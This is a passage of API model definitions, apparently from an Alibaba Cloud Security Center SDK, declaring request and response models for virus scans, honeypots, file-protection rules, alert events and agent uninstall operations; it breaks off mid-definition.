model StartDiscoverDatabaseTaskResponseBody = {
  createMark?: string(name='CreateMark', description='The ID of the scan task.', example='48bced6d-2aee-4fa2-9aba-b846b77b****'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F46921AF-CC55-5971-92C9-7E09E160****'),
}

model StartDiscoverDatabaseTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: StartDiscoverDatabaseTaskResponseBody(name='body'),
}

async function startDiscoverDatabaseTask(request: StartDiscoverDatabaseTaskRequest): StartDiscoverDatabaseTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'StartDiscoverDatabaseTask', 'POST', '/', 'json', false, 'json', request);
}

model StartPreCheckDatabaseRequest {
  databaseType: string(name='DatabaseType', description='The type of the database. Valid values:

*   **MYSQL**
*   **MSSQL**
*   **Oracle**', example='MYSQL', position='Query'),
  instanceUuid: string(name='InstanceUuid', description='The UUID of the agent that is used to back up the data of the database.

> You can call the [DescribeUniBackupDatabase](~~DescribeUniBackupDatabase~~) operation to query the UUID.', example='ec1c0ba21d2911ed800000163e0e****', position='Query'),
  uniRegionId: string(name='UniRegionId', description='The region ID of the server that hosts the database.', example='cn-hongkong', position='Query'),
}

model StartPreCheckDatabaseResponseBody = {
  createMark?: string(name='CreateMark', description='The ID of the database precheck task.', example='t-0006d4pydyir6l1k****'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F6DC2DFF-AB3A-563A-8FC2-3D0D991E****'),
}

model StartPreCheckDatabaseResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: StartPreCheckDatabaseResponseBody(name='body'),
}

async function startPreCheckDatabase(request: StartPreCheckDatabaseRequest): StartPreCheckDatabaseResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'StartPreCheckDatabase', 'POST', '/', 'json', false, 'json', request);
}

model StartVirusScanTaskRequest {
  targetInfo: string(name='TargetInfo', description='The asset on which you want to perform a virus scan task. You can select servers or server groups to scan for viruses. The value is a string that consists of JSON arrays. Each element in a JSON array is a JSON struct that contains the following fields:

*   **type**: the type of the asset on which you want to perform a virus scan task. Valid values:

    *   **groupId**: server group.
    *   **uuid**: server.

*   **name**: the name of the server or server group.

*   **target**: the asset on which you want to perform a virus scan task. Valid values:

    *   If you set **type** to **groupId**, you must set this field to the ID of the server group. You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of server groups.
    *   If you set **type** to **uuid**, you must set this field to the UUID of the server. You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='[{"type":"uuid","name":"Host001","target":"503201a7-14c6-4280-801b-1169ed42****"}]', position='Query'),
}

model StartVirusScanTaskResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='DAE17926-4ABE-4DBD-9600-DDCB9B200F35'),
  scanTaskId?: long(name='ScanTaskId', description='The ID of the virus scan task.', example='282832'),
}

model StartVirusScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: StartVirusScanTaskResponseBody(name='body'),
}

async function startVirusScanTask(request: StartVirusScanTaskRequest): StartVirusScanTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'StartVirusScanTask', 'POST', '/', 'json', false, 'json', request);
}

model StopHoneypotRequest {
  honeypotId: string(name='HoneypotId', description='The honeypot ID.

>  You can call the [ListHoneypot](~~ListHoneypot~~) operation to obtain IDs of honeypots.', example='444c699ac151b183b04b562b1dc02639d504c9d097246a322de75c963fe*****', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
}

model StopHoneypotResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    controlNodeName?: string(name='ControlNodeName', description='The name of the management node to which the honeypot belongs.', example='managerNoden****'),
    honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.', example='9bf8cd373112263d4bc102fc5dba9d9f812ee05d4d35c487d330d52e937f****'),
    honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the image.', example='RuoYi'),
    honeypotImageName?: string(name='HoneypotImageName', description='The name of the image that is used for the honeypot.', example='metabase'),
    honeypotName?: string(name='HoneypotName', description='The name of the honeypot.', example='hyl-phpmya****'),
    nodeId?: string(name='NodeId', description='The ID of the management node.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
    presetId?: string(name='PresetId', description='The ID of the honeypot custom parameter.', example='868a7579-00b5-4a74-999d-8bd3f411****'),
    state?: [ string ](name='State', description='The statuses of the honeypots.'),
  }(name='Data', description='The data returned.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='D65AADFC-1D20-5A6A-8F6A-9FA53C*****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model StopHoneypotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: StopHoneypotResponseBody(name='body'),
}

async function stopHoneypot(request: StopHoneypotRequest): StopHoneypotResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'StopHoneypot', 'POST', '/', 'json', false, 'json', request);
}

model SubmitCheckRequest {
  scanRange?: string(name='ScanRange', description='The check items that are scanned. Valid values:

*   **FULL**: All check items are scanned.
*   **POLICY**: Only the check items that are configured are scanned.', example='POLICY', position='Query'),
}

model SubmitCheckResponseBody = {
  data?: {
    operateCode?: string(name='OperateCode', description='The operation code of the configuration assessment task.

*   **Throttling**: frequency limit', example='Throttling'),
  }(name='Data', description='The data returned if the call is successful.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE8369A6-A843-5E1B-A613-78E6920D****'),
  taskId?: string(name='TaskId', description='The ID of the configuration assessment task.', example='5fe3f65d-4012-455d-8232-2a98a858****'),
}

model SubmitCheckResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SubmitCheckResponseBody(name='body'),
}

async function submitCheck(request: SubmitCheckRequest): SubmitCheckResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'SubmitCheck', 'POST', '/', 'json', false, 'json', request);
}

model UnMarkMonitorAccountsRequest {
  accountIds: string(name='AccountIds', example='125267953644XXXX,125807832682XXXX', position='Query'),
}

model UnMarkMonitorAccountsResponseBody = {
  requestId?: string(name='RequestId', example='3B7EF1A4-E970-5A7F-91CA-416F9881333E'),
}

model UnMarkMonitorAccountsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UnMarkMonitorAccountsResponseBody(name='body'),
}

async function unMarkMonitorAccounts(request: UnMarkMonitorAccountsRequest): UnMarkMonitorAccountsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UnMarkMonitorAccounts', 'POST', '/', 'json', false, 'json', request);
}

model UnbindAegisRequest {
  uuids: string(name='Uuids', description='The UUID of the server that you want to unbind. Separate multiple UUIDs with commas (,).

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='4fe8e1cd-3c37-4851-b9de-124da32c****', position='Query'),
}

model UnbindAegisResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='825F5526-2A17-4279-857F-F790E9590171'),
}

model UnbindAegisResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UnbindAegisResponseBody(name='body'),
}

/**
  * If you no longer require protection for servers that are not deployed on Alibaba Cloud, you can call this operation to unbind the servers from Security Center. After you unbind a server that is not deployed on Alibaba Cloud from Security Center, the server no longer consumes the quota of protected servers or protected server vCPUs. This way, you can install the Security Center agent on other servers to meet your business requirements.
  * > You can unbind only the servers that are not deployed on Alibaba Cloud from Security Center. If you use an Alibaba Cloud Elastic Compute Service (ECS) instance, you do not need to unbind the ECS instance. If you uninstall the Security Center agent from an ECS instance, the ECS instance still exists as a disconnected server in the asset list of the Security Center console. The ECS instance is not removed from the asset list.
  * **Prerequisites**
  * *   The server that you want to unbind from Security Center is not deployed on Alibaba Cloud and the Security Center agent is disabled for the server. In this case, the agent is in the Close state and Security Center does not protect the server. You can call the [PauseClient](~~PauseClient~~) operation to disable the agent.
  * *   The client protection feature is disabled for the server that you want to unbind from Security Center. For more information about how to disable the client protection feature, see [Use the client protection feature](https://www.alibabacloud.com/help/en/security-center/latest/local-file-detection-engine).
  *
 */
async function unbindAegis(request: UnbindAegisRequest): UnbindAegisResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UnbindAegis', 'POST', '/', 'json', false, 'json', request);
}

model UninstallBackupClientRequest {
  policyVersion: string(name='PolicyVersion', description='The version of the anti-ransomware policy. You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the versions of anti-ransomware policies. Valid values:

*   **1.0.0**
*   **2.0.0**', example='2.0.0', position='Query'),
  uuid?: string(name='Uuid', description='The UUID of the server from which you want to uninstall the anti-ransomware agent.

> You must specify at least one of the UuidList and Uuid parameters.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA0****', position='Query'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers from which you want to uninstall the anti-ransomware agent.

> You must specify at least one of the UuidList and Uuid parameters.', example='["D0D6E6E4-CB8C-4897-B852-46AEFDA0****", "3bb30859-b3b5-4f28-868f-b0892c98****"]', position='Query'),
}

model UninstallBackupClientResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8eec3b63-18af-454b-8c17-aabcf7190b70'),
}

model UninstallBackupClientResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UninstallBackupClientResponseBody(name='body'),
}

async function uninstallBackupClient(request: UninstallBackupClientRequest): UninstallBackupClientResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UninstallBackupClient', 'POST', '/', 'json', false, 'json', request);
}

model UninstallRaspAttachRequest {
  applicationId: string(name='ApplicationId', description='The application group ID.', example='64b8b994563c306b4fedxxxx', position='Query'),
  ecsUUIDList?: [ string ](name='EcsUUIDList', description='The UUIDs of ECS instances from which the RASP agent is to be uninstalled.', position='Query'),
}

model UninstallRaspAttachResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='ADE57832-9666-511C-9A80-B87DE2E8****'),
}

model UninstallRaspAttachResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UninstallRaspAttachResponseBody(name='body'),
}

async function uninstallRaspAttach(request: UninstallRaspAttachRequest): UninstallRaspAttachResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UninstallRaspAttach', 'POST', '/', 'json', false, 'json', request);
}

model UninstallUniBackupAgentRequest {
  policyId: long(name='PolicyId', description='The ID of the anti-ransomware policy.

> You can call the [DescribeUniBackupPolicies](~~DescribeUniBackupPolicies~~) operation to query the IDs of anti-ransomware policies.', example='123', position='Query'),
}

model UninstallUniBackupAgentResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9D97AFC3-AA58-5B8F-BBC4-16D7D8AB****'),
}

model UninstallUniBackupAgentResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UninstallUniBackupAgentResponseBody(name='body'),
}

async function uninstallUniBackupAgent(request: UninstallUniBackupAgentRequest): UninstallUniBackupAgentResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UninstallUniBackupAgent', 'POST', '/', 'json', false, 'json', request);
}

model UpdateAlarmEventRequest {
  alarmEventIdList?: [ long ](name='AlarmEventIdList', description='The IDs of the alert events.', position='Body'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Body'),
  operationCode?: string(name='OperationCode', description='The operation that you want to perform on the alert events. Valid values:

*   **manual_handled**: handle the alert events.
*   **ignore**: igore the alert events.
*   **cancel_ignore**: remove the alert events from the whitelist.', example='ignore', position='Body'),
}

model UpdateAlarmEventResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='AC1E0E53-DEF3-5D96-B170-19130EA****'),
}

model UpdateAlarmEventResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateAlarmEventResponseBody(name='body'),
}

async function updateAlarmEvent(request: UpdateAlarmEventRequest): UpdateAlarmEventResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UpdateAlarmEvent', 'POST', '/', 'json', true, 'form', request);
}

model UpdateClientAlertModeRequest {
  mode?: string(name='Mode', description='The protection mode. Valid values:

*   **strict**: The strict mode. False positives may be generated. We recommend that you enable this mode during major events.
*   **balance**: The balanced mode. More risks can be detected with less false positives in this mode.', example='balance', position='Query'),
  uuids?: [ string ](name='Uuids', description='The UUIDs of servers.', position='Query'),
}

model UpdateClientAlertModeResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
  requestId?: string(name='RequestId', description='The request ID.', example='259E3E77-CA6D-5407-84A5-3A1C98D12F14'),
}

model UpdateClientAlertModeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateClientAlertModeResponseBody(name='body'),
}

async function updateClientAlertMode(request: UpdateClientAlertModeRequest): UpdateClientAlertModeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UpdateClientAlertMode', 'POST', '/', 'json', false, 'json', request);
}

model UpdateCommonSwitchConfigRequest {
  targetDefault?: string(name='TargetDefault', description='Specifies whether to turn on the switch for newly added servers. Valid values:

*   **add**: yes
*   **del**: no', example='add', position='Query'),
  type?: string(name='Type', description='The type of the switch.

>  You can call the [ListClientUserDefineRules](~~ListClientUserDefineRules~~) or [ListSystemClientRules](~~ListSystemClientRules~~) operation to obtain the type from the response parameter SwitchId.', example='USER-DEFINE-RULE-SWITCH-TYPE_190****', position='Query'),
}

model UpdateCommonSwitchConfigResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='655B538A-A31B-58F2-A3FB-2EF4390D****'),
}

model UpdateCommonSwitchConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateCommonSwitchConfigResponseBody(name='body'),
}

async function updateCommonSwitchConfig(request: UpdateCommonSwitchConfigRequest): UpdateCommonSwitchConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UpdateCommonSwitchConfig', 'POST', '/', 'json', false, 'json', request);
}

model UpdateFileProtectEventStatusRequest {
  id?: [ long ](name='Id', description='The IDs of the events.', position='Query'),
  status?: int32(name='Status', description='The handling status of the event. Valid values:

*   **0**: unhandled
*   **1**: handled
*   **2**: added to the whitelist', example='0', position='Query'),
}

model UpdateFileProtectEventStatusResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='C286491D-4A2F-589A-B63B-D2AD3DA9BD71'),
}

model UpdateFileProtectEventStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateFileProtectEventStatusResponseBody(name='body'),
}

async function updateFileProtectEventStatus(request: UpdateFileProtectEventStatusRequest): UpdateFileProtectEventStatusResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UpdateFileProtectEventStatus', 'POST', '/', 'json', false, 'json', request);
}

model UpdateFileProtectRemarkRequest {
  id?: long(name='Id', description='The ID of the event.', example='1764', position='Query'),
  remark?: [ string ](name='Remark', description='The remarks.', position='Query'),
}

model UpdateFileProtectRemarkResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='226440DF-DFCD-5B93-9951-FCF0A16A6B78'),
}

model UpdateFileProtectRemarkResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateFileProtectRemarkResponseBody(name='body'),
}

async function updateFileProtectRemark(request: UpdateFileProtectRemarkRequest): UpdateFileProtectRemarkResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UpdateFileProtectRemark', 'POST', '/', 'json', false, 'json', request);
}

model UpdateFileProtectRuleRequest {
  alertLevel?: int32(name='AlertLevel', description='The severity of alerts. Valid values:

*   0: does not generate alerts
*   1: sends notifications
*   2: suspicious
*   3: high-risk', example='0', position='Query'),
  fileOps: [ string ](name='FileOps', description='The operations performed on the files.', position='Query'),
  filePaths: [ string ](name='FilePaths', description='The paths to the monitored files. Wildcard characters are supported.', position='Query'),
  id?: long(name='Id', description='The ID of the rule.', example='1062', position='Query'),
  procPaths: [ string ](name='ProcPaths', description='The paths to the monitored processes.', position='Query'),
  ruleAction?: string(name='RuleAction', description='The handling method of the rule. Valid values:

*   pass: allow
*   alert', example='pass', position='Query'),
  ruleName: string(name='RuleName', description='The name of the rule.', example='test-rule-1', position='Query'),
  status?: int32(name='Status', description='The status of the rule. Valid values:

*   **0**: disabled
*   **1**: enabled', example='1', position='Query'),
}

model UpdateFileProtectRuleResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='339227F4-C9E1-526F-8347-1099C11F65FB'),
}

model UpdateFileProtectRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateFileProtectRuleResponseBody(name='body'),
}

async function updateFileProtectRule(request: UpdateFileProtectRuleRequest): UpdateFileProtectRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UpdateFileProtectRule', 'POST', '/', 'json', false, 'json', request);
}

model UpdateFileUploadLimitRequest {
  limit: long(name='Limit', description='The QPS limit on the files uploaded from the client. Valid values: 100 to 10000.', example='100', position='Query'),
}

model UpdateFileUploadLimitResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8BF6F'),
}

model UpdateFileUploadLimitResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateFileUploadLimitResponseBody(name='body'),
}

async function updateFileUploadLimit(request: UpdateFileUploadLimitRequest): UpdateFileUploadLimitResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UpdateFileUploadLimit', 'POST', '/', 'json', false, 'json', request);
}

model UpdateHoneypotRequest {
  honeypotId: string(name='HoneypotId', description='The ID of the honeypot.

>  You can call the [ListHoneypot](~~ListHoneypot~~) operation to query the IDs of honeypots.', example='945607c2ae2a1a737c04599d6608065688bfc6048d9b9d306ce8dc8191c278b4', position='Query'),
  honeypotName?: string(name='HoneypotName', description='The custom name of the honeypot.', example='ExtMail', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  meta?: string(name='Meta', description='The custom configuration of the honeypot.

> You can call the [ListAvailableHoneypot](~~ListAvailableHoneypot~~) operation to query the configurations of honeypots from the **Template** response parameter.', example='{\\"burp\\":\\"open\\",\\"webshell\\":\\"open\\",\\"trojan_git\\":\\"close\\",\\"portrait_option\\":\\"true\\"}', position='Query'),
}

model UpdateHoneypotResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.', example='9bf8cd373112263d4bc102fc5dba9d9f812ee05d4d35c487d330d52e937f****'),
    honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the honeypot image.', example='Webmin'),
    honeypotImageName?: string(name='HoneypotImageName', description='The name of the honeypot image.', example='webpage'),
    honeypotName?: string(name='HoneypotName', description='The custom name of the honeypot.', example='hyl-phpmyadmin'),
    nodeId?: string(name='NodeId', description='The ID of the management node.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
    presetId?: string(name='PresetId', description='The ID of the custom configuration for the honeypot.', example='868a7579-00b5-4a74-999d-8bd3f411e8a3'),
    state?: [ string ](name='State', description='An array that consists of the status information about the honeypot.'),
  }(name='Data', description='The information about the honeypot.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3B323ADD-6CF8-51F6-9047-2F0A4E3F5EFD'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model UpdateHoneypotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateHoneypotResponseBody(name='body'),
}

async function updateHoneypot(request: UpdateHoneypotRequest): UpdateHoneypotResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UpdateHoneypot', 'POST', '/', 'json', false, 'json', request);
}

model UpdateHoneypotNodeRequest {
  availableProbeNum: int32(name='AvailableProbeNum', description='The number of available probes.', example='20', position='Query'),
  nodeId: string(name='NodeId', description='The ID of the management node.

> You can call the [ListHoneypotNode](~~ListHoneypotNode~~) operation to query the IDs of management nodes.', example='67ab3f4c-3db5-4fc3-b51f-00f8bfabfa08', position='Query'),
  nodeName: string(name='NodeName', description='The name of the management node.', example='HoneypotNodeTest', position='Query'),
  securityGroupProbeIpList?: [ string ](name='SecurityGroupProbeIpList', description='The CIDR blocks that are allowed to access the management node.', position='Query'),
}

model UpdateHoneypotNodeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='753D92B3-A062-544F-8E7B-C813AA9FA9FC'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model UpdateHoneypotNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateHoneypotNodeResponseBody(name='body'),
}

async function updateHoneypotNode(request: UpdateHoneypotNodeRequest): UpdateHoneypotNodeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UpdateHoneypotNode', 'POST', '/', 'json', false, 'json', request);
}

model UpdateHoneypotPresetRequest {
  honeypotImageName?: string(name='HoneypotImageName', description='The name of the image that is used for the honeypot.', example='metabase', position='Query'),
  honeypotPresetId: string(name='HoneypotPresetId', description='The ID of the honeypot template.

> You can call the [ListHoneypotPreset](~~ListHoneypotPreset~~) operation to query the IDs of honeypot templates.', example='f75eddce-e9d3-4a88-af95-b10b6f65xxxx', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh', position='Query'),
  meta?: string(name='Meta', description='The custom configurations of the honeypot template. The value is a JSON string that contains the following fields:

*   **portrait_option**: Social Source Tracing
*   **burp**: Burp-specific Defense
*   **trojan_git**: Git-specific Defense', example='{"portrait_option":true,"burp":"open"}', position='Query'),
  presetName?: string(name='PresetName', description='The custom name of the honeypot template.', example='apc_web_python', position='Query'),
}

model UpdateHoneypotPresetResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='60922C83-6B19-5A57-8F13-4663C6D391F4'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model UpdateHoneypotPresetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateHoneypotPresetResponseBody(name='body'),
}

async function updateHoneypotPreset(request: UpdateHoneypotPresetRequest): UpdateHoneypotPresetResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UpdateHoneypotPreset', 'POST', '/', 'json', false, 'json', request);
}

model UpdateHoneypotProbeRequest {
  arp?: boolean(name='Arp', description='Specifies whether address resolution protocol (ARP) is enabled for the check type.', example='false', position='Query'),
  displayName?: string(name='DisplayName', description='The name of the probe.', example='svwsx-vpc-4430', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh', position='Query'),
  ping?: boolean(name='Ping', description='Specifies whether ping is enabled for the check type.', example='true', position='Query'),
  probeId: string(name='ProbeId', description='The ID of the probe.

> You can call the [ListHoneypotProbe](~~ListHoneypotProbe~~) operation to query the IDs of probes.', example='bbe7e382-956f-473e-beed-bc73a258****', position='Query'),
  serviceIpList?: [ string ](name='ServiceIpList', description='The IP addresses that are monitored.', position='Query'),
}

model UpdateHoneypotProbeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='AB62FFAA-E1A5-5D7C-8D97-0F16C6A6F520'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model UpdateHoneypotProbeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateHoneypotProbeResponseBody(name='body'),
}

async function updateHoneypotProbe(request: UpdateHoneypotProbeRequest): UpdateHoneypotProbeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UpdateHoneypotProbe', 'POST', '/', 'json', false, 'json', request);
}

model UpdateHoneypotProbeBindRequest {
  bindId?: string(name='BindId', example='f52e8624-e43c-473c-8312-e0fed384****', position='Query'),
  bindPortList?: [ 
    {
      bindPort?: boolean(name='BindPort', example='false'),
      endPort?: int32(name='EndPort', example='81'),
      fixed?: boolean(name='Fixed', example='0'),
      id?: long(name='Id', example='3183'),
      proto?: string(name='Proto', example='tcp'),
      startPort?: int32(name='StartPort', example='81'),
      targetPort?: int32(name='TargetPort', example='80'),
    }
  ](name='BindPortList', position='Query'),
  bindType?: string(name='BindType', example='forward_honey', position='Query'),
  currentPage?: int32(name='CurrentPage', example='1', position='Query'),
  honeypotId?: string(name='HoneypotId', example='dba7d44775be8e0e5888ee3b1a62554a93d2512247cabc38ddeac17a3b3f****', position='Query'),
  id?: long(name='Id', example='1906', position='Query'),
  lang?: string(name='Lang', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', example='20', position='Query'),
  ports?: string(name='Ports', example='{\\"tcp\\":\\"1-65535\\",\\"udp\\":\\"1-65535\\"}', position='Query'),
  probeId?: string(name='ProbeId', example='36bad711-d1ac-4419-ac68-c1aa280f****', position='Query'),
  serviceIpList?: [ string ](name='ServiceIpList', position='Query'),
  setStatus?: int32(name='SetStatus', example='0', position='Query'),
}

model UpdateHoneypotProbeBindResponseBody = {
  code?: string(name='Code', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='425D9617-4F4F-571E-A9CF-0245C9FC****'),
  success?: boolean(name='Success', example='true'),
}

model UpdateHoneypotProbeBindResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateHoneypotProbeBindResponseBody(name='body'),
}

async function updateHoneypotProbeBind(request: UpdateHoneypotProbeBindRequest): UpdateHoneypotProbeBindResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UpdateHoneypotProbeBind', 'POST', '/', 'json', false, 'json', request);
}

model UpdateImageEventOperationRequest {
  id?: long(name='Id', example='814163', position='Query'),
  scenarios?: string(name='Scenarios', example='{\\"type\\": \\"repo\\", \\"value\\": \\"test-aaa/shenzhen-repo-01\\"}', position='Query'),
}

model UpdateImageEventOperationResponseBody = {
  code?: string(name='Code', example='200'),
  data?: {
    id?: long(name='Id', example='67429'),
  }(name='Data'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='7532B7EE-7CE7-5F4D-BF04-B12447DD****'),
  success?: boolean(name='Success', example='true'),
}

model UpdateImageEventOperationResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateImageEventOperationResponseBody(name='body'),
}

async function updateImageEventOperation(request: UpdateImageEventOperationRequest): UpdateImageEventOperationResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UpdateImageEventOperation', 'POST', '/', 'json', false, 'json', request);
}

model UpdateImageVulWhitelistTargetRequest {
  id?: long(name='Id', description='The whitelist ID.', example='2000083', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  reason?: string(name='Reason', description='The reason why you add the vulnerability to the whitelist.', example='ignore', position='Query'),
  source?: string(name='Source', description='The source of the whitelist. Valid values:

*   **image**
